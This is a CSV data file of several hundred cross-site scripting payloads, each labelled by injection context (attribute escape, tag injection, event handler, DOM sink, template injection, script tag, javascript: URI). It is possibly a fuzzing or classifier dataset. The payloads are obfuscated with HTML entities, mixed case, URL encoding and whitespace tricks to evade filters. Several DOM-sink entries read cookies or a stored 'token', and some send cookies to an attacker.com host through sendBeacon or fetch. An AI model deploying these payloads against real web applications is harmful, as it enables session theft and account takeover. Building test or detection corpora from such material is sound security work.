payload,context
"ObjEct.asSigN(wIndOw,{""oNweBkiTfuLlsCreEncHanGe"":coNfiRm})",dom_sink
%22 onsearch=alert(%27XSS%27) %22,attribute_escape
"""%3E%3Cimg src=x onwebkitfullscreenchange=alert('XSS')%3E",attribute_escape
onmozfullscreenchange=prompt&#40;%27XSS%27&#41;,event_handler
' oNtoUchEnd=coNfiRm('XSS') ',attribute_escape
"""><Img srC=x onPoiNteRdoWn=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
' onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
\%27 onvolumechange=alert(%27XSS%27)//,attribute_escape
OnbEfoRepAstE=cOnsOle.loG/**/(LocAtiOn.HasH),event_handler
<!--><iframe onsecuritypolicyviolation=confirm(%27XSS%27)>,tag_injection
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""evAl(StrIng.frOmCHarCodE(88,83,83))""",dom_sink
"Object.assign(window,{%22onpagereveal%22:console.log})",dom_sink
%22 ><svg ondblclick=console.log(%27XSS%27)>,attribute_escape
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=consol&#101;.log(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))>""",dom_sink
${{ProMpt(1)}},template_injection
"`><img src=x onload=alert(String.fromCharCode(88,83,83))>",attribute_escape
"<t&#101;mpl&#97;t&#101;
onr&#101;s&#101;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
"\"" ontoggle=\u0061lert(document.domain)//",attribute_escape
"""><img src=x onpagehide=confirm(1)>",attribute_escape
""" ><svg onpagehide=\u0061lert(document.domain)>",attribute_escape
""" ><svg on&#101;rror=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape
<script	>alert(%27XSS%27)</script>,script_injection
%3Cscript%3Ealert`location.hash`%3C/script%3E,script_injection
' oNanImaTioNitEraTioN=cOnsOle.loG('XSS') ',attribute_escape
"""><math onplaying=console.log('XSS')>",tag_injection
"""><Img srC=x onPauSe=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
"' ><svg onpl&#97;y=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
onpointerup=prompt&#40;location.hash&#41;,event_handler
"element.setAttribute(""onclick"",""console.log('//attacker.com/?c='+document.cookie)"")",dom_sink
"""%3E%3Cdialog onpointerover=confirm(1)%3E",tag_injection
<%= \u0061lert document.domain %>,template_injection
"\"" ondr&#97;g&#101;nt&#101;r=consol&#101;.log(1)//",attribute_escape
&quOt; onBefOreCopY=pRomPt(LocAtiOn.HasH) X=&QuoT;,attribute_escape
"\"" ongotpointercapture=\u0061lert(1)//",attribute_escape
<script>//prompt(%27XSS%27)</script>,script_injection
"<source
oninput=\u0061lert(location.hash)>",tag_injection
%3Ctitle onstalled=alert('XSS') onstalled=alert('XSS')%3E,tag_injection
"Object.assign(window,{%22onmousewheel%22:prompt})",dom_sink
%27 onmousedown=confirm(document.domain) %27,attribute_escape
<&#97; x=y ons&#101;&#97;rch=&#97;l&#101;rt(1)>,tag_injection
<!--><TabLe OncOpy=coNfiRm('XSS')>,tag_injection
 onanimationstart=\u0061lert('XSS'),event_handler
""" ondblclick=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
' ><svg onbeforematch=confirm(location.hash)>,attribute_escape
"""><img src=x onk&#101;ypr&#101;ss=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"ObjEct.asSigN(wIndOw,{""oNplAyiNg"":alErt})",dom_sink
	onDroP=pRomPt(LocAtiOn.HasH),event_handler
	ondrop=prompt(location.hash),event_handler
 onPoiNteRmoVe=ConSolE.lOg(DocUmeNt.DomAin),event_handler
"""><img src=x onmousedown=confirm(document.domain)>",attribute_escape
&quot; on&#101;nd&#101;d=&#97;l&#101;rt(1) x=&quot;,attribute_escape
\' OnsCroLlsNapChaNge=alErt(1)//,attribute_escape
`%3E%3Cimg src=x onended=alert(1)%3E,attribute_escape
{{#WitH cOnfIrm(1)}}...{{/wIth}},template_injection
"onpagereveal=confirm/*x*/(String.fromCharCode(88,83,83))",event_handler
"""%3E%3Cimg src=x onanimationiteration=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
'><img src=x onpointermove=prompt(location.hash)>,attribute_escape
"%22 ><svg oncopy=alert(String.fromCharCode(88,83,83))>",attribute_escape
"location.href=""javascript:console.log(localStorage.getItem('token'))""",dom_sink
document.body.innerHTML=%22<img src=x onerror=prompt(localStorage.getItem(%27token%27))>%22,dom_sink
" ong&#101;stur&#101;&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
\' onscrollsnapchange=\u0061lert('XSS')//,attribute_escape
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=&#101;v&#97;l('XSS')>""",dom_sink
' ><svg onplay=confirm(document.domain)>,attribute_escape
%3Cset	onpointermove=confirm(location.hash)%3E,tag_injection
OnsCroLleNd=ProMpt(1),event_handler
"window[""console.log""](location.hash)",dom_sink
<template/oncontextmenu=console.log(1)>,tag_injection
<a	onmozfullscreenchange=\u0061lert(location.hash)>,tag_injection
%3Canimatemotion src=x onwaiting=alert(location.hash)%3E,tag_injection
"""><img src=x onpromptdismiss=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape
OndRop=coNsoLe.Log(doCumEnt.doMaiN),event_handler
"Object.assign(window,{%22onwebkitfullscreenchange%22:alert})",dom_sink
`><Img srC=x onConTexTmeNu=AleRt(DocUmeNt.DomAin)>,attribute_escape
"\"" onp&#97;g&#101;show=consol&#101;.log('XSS')//",attribute_escape
{{ confirm(docum&#101;nt.cooki&#101;) }},template_injection
"Object.assign(window,{""oninvalid"":XMLHttpRequest})",dom_sink
<b&#97;s&#101; src=x onk&#101;ydown=&#97;l&#101;rt('XSS')>,tag_injection
"""><td onsubmit=confirm(document.domain)>",tag_injection
 onrepeat=alert('XSS'),event_handler
"EleMenT.sEtATtrIbuTe(""onCliCk"",""eVal('XSS')"")",dom_sink
"""><div onpause=prompt(String.fromCharCode(88,83,83))>",tag_injection
"__proto__[""onc&#97;npl&#97;y""]=XMLHttpR&#101;qu&#101;st('XSS')",dom_sink
<animatemotion x=y ondrop=confirm(location.hash)>,tag_injection
"""><img src=x onerror=confirm(location.hash)>",attribute_escape
"<blink
onpopst&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
onchange=javascript:alert(document.domain),event_handler
"""><source oninput=\u0061lert(location.hash)>",tag_injection
ondblclick=j&#97;v&#97;script:consol&#101;.log(1),event_handler
<meta onpointerover=confirm(1) onpointerover=confirm(1)>,tag_injection
{{constructor[%27constructor%27](%27confirm(document.domain)%27)()}},template_injection
"<xsS	oNanImaTioNstArt=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
<!--><a onkeypress=confirm(1)>,tag_injection
"s&#101;tTim&#101;out(""consol&#101;.log(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"",0)",dom_sink
<marquee x=y onkeydown=confirm(1)>,tag_injection
' ><svg onmousewheel=alert(document.domain)>,attribute_escape
OnwEbkItfUllScrEenChaNge=prOmpT/***/('XSS'),event_handler
<!--><area onload=console.log(document.domain)>,tag_injection
%3Cscript%3Econfirm('XSS')%3C/script%3E,script_injection
"""%3E%3Ca onbeforematch=prompt(document.domain)%3E",tag_injection
""" %3E%3Csvg ontoggle=console.log(1)%3E",attribute_escape
""" ><svg onmousewheel=prompt(document.domain)>",attribute_escape
#{{confirm(document.domain)}},template_injection
document.querySelector(%22body%22).innerHTML+=%22confirm(localStorage.getItem(%27token%27))%22,dom_sink
""" onmouseup=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
"SetTimEouT(""AleRt(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)"",0)",dom_sink
<marquee onauxclick=confirm(location.hash)/>,tag_injection
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""consol&#101;.log(docum&#101;nt.cooki&#101;)""",dom_sink
"%3Cvideo onpaste=alert(String.fromCharCode(88,83,83))/%3E",tag_injection
"ongestureend=javascr	ipt:confirm(String.fromCharCode(88,83,83))",event_handler
%3Cobject onanimationcancel=alert(document.domain)%3E,tag_injection
"`><img src=x onp&#97;st&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<form x=y onreset=console.log(document.domain)>,tag_injection
""" ><svg onmozfullscreenchange=\u0061lert(1)>",attribute_escape
'><img src=x ontouchend=confirm('XSS')>,attribute_escape
' oNseLecT=cOnsOle.loG(lOcaTioN.hAsh) ',attribute_escape
""" ondrop=confirm(document.domain) """,attribute_escape
'><img src=x onpromptdismiss=\u0061lert('XSS')>,attribute_escape
document.querySelector(%22body%22).innerHTML+=%22console.log(document.cookie)%22,dom_sink
"""><scr	ipt>alert(1)</scr	ipt>",script_injection
&quot; onhashchange=confirm(document.domain) x=&quot;,attribute_escape
'><img src=x onended=prompt(document.domain)>,attribute_escape
	onp&#97;g&#101;show=prompt(1),event_handler
"<!--><iframe ontouchstart=prompt(String.fromCharCode(88,83,83))>",tag_injection
&quot; ontoggle=confirm('XSS') x=&quot;,attribute_escape
%3Cobject src=x onanimationcancel=alert(document.domain)%3E,tag_injection
"\"" onp&#97;us&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=alert(localStorage.getItem(%27token%27))>%22)",dom_sink
' ><svG oNmoUseOveR=pRomPt(DocUmeNt.DomAin)>,attribute_escape
<script>console.log(%27XSS%27)</script>,script_injection
"`><Img srC=x onSelEct=prOmpT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
"<base
oninput=\u0061lert('XSS')>",tag_injection
<&#97;nim&#97;t&#101;motion on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(1) on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(1)>,tag_injection
""" oNanImaTioNitEraTioN=cOnfIrm('XSS') """,attribute_escape
\%22 onwebkitanimationend=prompt(1)//,attribute_escape
<!--><tr onpointerrawupdate=\u0061lert(location.hash)>,tag_injection
%27 ><svg ongotpointercapture=alert(document.domain)>,attribute_escape
""" onanimationend=confirm(document.domain) """,attribute_escape
""" oNscRolLsnApcHanGe=AleRt(1) """,attribute_escape
<seLecT oNgoTpoIntErcAptUre=coNfiRm(DocUmeNt.DomAin)/>,tag_injection
<!--><script onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
%27><img src=x onpopstate=alert(%27XSS%27)>,attribute_escape
"&#101;v&#97;l(""f&#101;tch('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)"")",dom_sink
	onanimationiteration=confirm(%27XSS%27),event_handler
'><img src=x on&#97;nim&#97;tionc&#97;nc&#101;l=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape
__proto__[%22onbeforecut%22]=console.log(1),dom_sink
"document.querySelector(""body"").innerHTML+=""console.log('XSS')""",dom_sink
"WinDow[""fEtcH""](loCatIon.haSh)",dom_sink
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt('XSS')>"")",dom_sink
"""%3E%3Cimg src=x onbeforecut=console.log(1)%3E",attribute_escape
"\"" onw&#97;iting=prompt(docum&#101;nt.dom&#97;in)//",attribute_escape
 onsubmit=confirm(1),event_handler
"\"" onclose=console.log(location.hash)//",attribute_escape
"document.querySelector(""body"").innerHTML+=""prompt('XSS')""",dom_sink
&quOt; onPasTe=ConFirM('XSS') X=&QuoT;,attribute_escape
"&quot; onpl&#97;ying=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
""" onmous&#101;ov&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in) x=""",attribute_escape
&quot; onpopstate=confirm(document.domain) x=&quot;,attribute_escape
"""><m&#97;rqu&#101;&#101; onpopst&#97;t&#101;=&#97;l&#101;rt('XSS')>",tag_injection
 ontransitionend=\u0061lert(location.hash),event_handler
%3Cselect/onmousewheel=alert(document.domain)%3E,tag_injection
"\"" onp&#97;g&#101;r&#101;v&#101;&#97;l=consol&#101;.log(1)//",attribute_escape
 onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt(1),event_handler
onr&#101;p&#101;&#97;t=j&#97;v&#97;script:&#97;l&#101;rt('XSS'),event_handler
"window[""prompt""](document.cookie+'&loc='+location.href)",dom_sink
"element.setAttribute(%22onclick%22,%22eval(%27//attacker.com/?c=%27+document.cookie)%22)",dom_sink
<s&#101;t/onc&#97;npl&#97;y=confirm(1)>,tag_injection
%27 ><svg ondrop=confirm(document.domain)>,attribute_escape
%27><img src=x onwheel=console.log(location.hash)>,attribute_escape
%27 onmousewheel=alert(location.hash) %27,attribute_escape
"__proto__[""ondr&#97;gov&#101;r""]=XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink
onp&#97;g&#101;hid&#101;=j&#97;v&#97;script:confirm(loc&#97;tion.h&#97;sh),event_handler
\' onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt(1)//,attribute_escape
	onend=\u0061lert(1),event_handler
""" onmous&#101;up=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"%27><img src=x onanimationiteration=confirm(String.fromCharCode(88,83,83))>",attribute_escape
""" ><svG oNpaGesWap=alErt(doCumEnt.doMaiN)>",attribute_escape
 ondrop=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler
"' ondblclick=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"%3Cplaintext
onrepeat=prompt('XSS')%3E",tag_injection
"""%3E%3Cdialog onended=console.log(1)%3E",tag_injection
"__proto__[""onh&#97;shch&#97;ng&#101;""]=&#101;v&#97;l(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink
<audio oninput=prompt(location.hash) oninput=prompt(location.hash)>,tag_injection
'><Img srC=x onCut=coNfiRm(1)>,attribute_escape
`%3E%3Cimg src=x ondrop=alert('XSS')%3E,attribute_escape
OnmOzfUllScrEenChaNge=prOmpT('XSS'),event_handler
%27 onended=console.log(document.domain) %27,attribute_escape
"""><img src=x onsecuritypolicyviolation=prompt(1)>",attribute_escape
"<tr
ontoggl&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
<meTa/OnsEcuRitYpoLicYviOlaTioN=pRomPt('XSS')>,tag_injection
"\"" onmous&#101;ov&#101;r=prompt(1)//",attribute_escape
"location.href=""javascr	ipt:prompt('//attacker.com/?c='+document.cookie)""",dom_sink
"Object.assign(window,{%22onmozfullscreenchange%22:alert})",dom_sink
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>""",dom_sink
onbeforecopy=console.log(%27XSS%27),event_handler
 onDraGovEr=ConFirM(1),event_handler
__${prOmpT(dOcuMenT.dOmaIn)}__::.X,template_injection
"java
script:console.log(document.domain)",js_uri
""" ontouchmov&#101;=prompt(1) """,attribute_escape
%3Ctr	ontoggle=console.log(document.domain)%3E,tag_injection
"""><img src=x onsearch=\u0061lert(1)>",attribute_escape
<seT/oNclOse=coNfiRm(DocUmeNt.DomAin)>,tag_injection
"EvaL(""FetCh(DocUmeNt.DomAin)"")",dom_sink
%3Ctemplate onsearch=console.log(document.domain)/%3E,tag_injection
"' ><svg on&#101;nd&#101;d=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"WinDow[""cOnsOle.loG""](doCumEnt.coOkiE)",dom_sink
%3Caudio src=x onpopstate=confirm(location.hash)%3E,tag_injection
""" ong&#101;stur&#101;st&#97;rt=prompt('XSS') """,attribute_escape
`%3E%3Cimg src=x onpageswap=alert(document.domain)%3E,attribute_escape
{{cOnfIrm(1)}},template_injection
' ><svG oNdrAgsTarT=cOnfIrm(1)>,attribute_escape
 ondrop=prompt(loc&#97;tion.h&#97;sh),event_handler
document.body.innerHTML=%22<img src=x onerror=confirm(btoa(document.cookie))>%22,dom_sink
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=cOnfIrm(loCatIon.haSh)>"")",dom_sink
<auDio srC=x onMouSeoVer=coNsoLe.Log('XSS')>,tag_injection
\' ons&#101;&#97;rch=prompt(docum&#101;nt.dom&#97;in)//,attribute_escape
%22><dialog onpagehide=console.log(1)>,tag_injection
"data:text/html,%3Cscript%3Ealert(1)%3C/script%3E",js_uri
%22 onbeforematch=alert(%27XSS%27) %22,attribute_escape
&quot; oncontextmenu=\u0061lert(1) x=&quot;,attribute_escape
<xsS	oNmoUseOveR=cOnsOle.loG('XSS')>,tag_injection
onmous&#101;&#101;nt&#101;r=prompt&#40;1&#41;,event_handler
"<form
onw&#97;iting=confirm(1)>",tag_injection
"Obj&#101;ct.&#97;ssign(window,{""onpoint&#101;rmov&#101;"":&#101;v&#97;l})",dom_sink
"""%3E%3Cimg src=x onwheel=alert('XSS')%3E",attribute_escape
`%3E%3Cimg src=x onhashchange=console.log(document.domain)%3E,attribute_escape
<plaintext x=y onrepeat=prompt(%27XSS%27)>,tag_injection
%22><meta onsecuritypolicyviolation=prompt(%27XSS%27)>,tag_injection
"setInterval(%22console.log(document.cookie+%27&loc=%27+location.href)%22,100)",dom_sink
"""><Xmp onTraNsiTioNenD=aLerT(lOcaTioN.hAsh)>",tag_injection
"\"" OnsCroLleNd=ProMpt(loCatIon.haSh)//",attribute_escape
\' ons&#101;l&#101;ct=consol&#101;.log(loc&#97;tion.h&#97;sh)//,attribute_escape
<!--><AniMatEmoTioN oNdrOp=ConFirM(lOcaTioN.hAsh)>,tag_injection
<diAloG/oNplAy=ProMpt(doCumEnt.doMaiN)>,tag_injection
\' onw&#101;bkittr&#97;nsition&#101;nd=confirm(loc&#97;tion.h&#97;sh)//,attribute_escape
"<embed
onwebkitfullscreenchange=confirm(location.hash)>",tag_injection
<spAn Src=x OncOpy=prOmpT(lOcaTioN.hAsh)>,tag_injection
"%3Cscript
ondblclick=prompt(1)%3E",tag_injection
<select/onpointermove=prompt('XSS')>,tag_injection
%3C!--%3E%3Cmath onscrollend=prompt(document.domain)%3E,tag_injection
""" %3E%3Csvg onpagehide=alert(location.hash)%3E",attribute_escape
"<animatetransform	ondragover=console.log(String.fromCharCode(88,83,83))>",tag_injection
javascr	ipt:prompt/**/(location.hash),js_uri
"""><img src=x onpagereveal=prompt(location.hash)>",attribute_escape
"""><Img srC=x onErrOr=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
"""%3E%3Cimg src=x ontransitionend=alert(document.domain)%3E",attribute_escape
`><img src=x onmousewheel=console.log(1)>,attribute_escape
%3Canimate x=y onfocus=console.log(document.domain)%3E,tag_injection
${confirm(%27XSS%27)|n},template_injection
OnbEfoRetOggLe=ProMpt('XSS'),event_handler
onfocusin=confirm(%27XSS%27),event_handler
"__proto__[""onscrollend""]=prompt(document.cookie+'&loc='+location.href)",dom_sink
onload=alert(document.domain),event_handler
"`><Img srC=x onFocUsoUt=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
&quot; onmousedown=confirm(1) x=&quot;,attribute_escape
"\' onanimationend=alert(String.fromCharCode(88,83,83))//",attribute_escape
%22 onfocus=alert(1) autofocus=%22,attribute_escape
 onscrollend=prompt(1),event_handler
'><img src=x onkeypress=alert(1)>,attribute_escape
""" onmousedown=console.log('XSS') """,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""on&#97;nim&#97;tion&#101;nd"":prompt})",dom_sink
"location.href=""javascript:prompt(document.cookie+'&loc='+location.href)""",dom_sink
"	onFocUsoUt=ProMpt(StRinG.fRomChaRCoDe(88,83,83))",event_handler
"__proto__[""ongotpoint&#101;rc&#97;ptur&#101;""]=&#97;l&#101;rt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink
"\"" onmozfullscreenchange=alert(1)//",attribute_escape
"' %3E%3Csvg onclose=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
<title	onstalled=\u0061lert('XSS')>,tag_injection
<baSe OniNvaLid=coNfiRm(LocAtiOn.HasH) OniNvaLid=coNfiRm(LocAtiOn.HasH)>,tag_injection
"\' OnaNimAtiOniTerAtiOn=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape
' onpoint&#101;rmov&#101;=prompt('XSS') ',attribute_escape
<!--><object onvolumechange=\u0061lert(1)>,tag_injection
ongotpointercapture=prompt(location.hash),event_handler
"Object.assign(window,{%22onwheel%22:XMLHttpRequest})",dom_sink
""" ><svg onscrollsnapchange=alert(1)>",attribute_escape
<foRm/OnpAgeRevEal=coNsoLe.Log(loCatIon.haSh)>,tag_injection
'><img src=x ongestureend=alert(1)>,attribute_escape
<&#97;nim&#97;t&#101;motion/ons&#101;curitypolicyviol&#97;tion=consol&#101;.log('XSS')>,tag_injection
%3Cscript	onkeydown=confirm(document.domain)%3E,tag_injection
%27 ontouchmove=confirm(document.domain) %27,attribute_escape
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>"")",dom_sink
""" ><svg onpause=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"__proto__[""onpoint&#101;rov&#101;r""]=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""on&#101;rror"":consol&#101;.log})",dom_sink
"'%3E%3Cimg src=x oncopy=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
onpointerup=\u0061lert&#40;document.domain&#41;,event_handler
<a Src=x OnmOzfUllScrEenChaNge=alErt(loCatIon.haSh)>,tag_injection
%22><img src=x onkeydown=alert(location.hash)>,attribute_escape
OnpOinTerRawUpdAte=coNsoLe.Log&#40;1&#41;,event_handler
""" ><svg onsearch=alert(1)>",attribute_escape
ongotpointercapture=prompt/**/(location.hash),event_handler
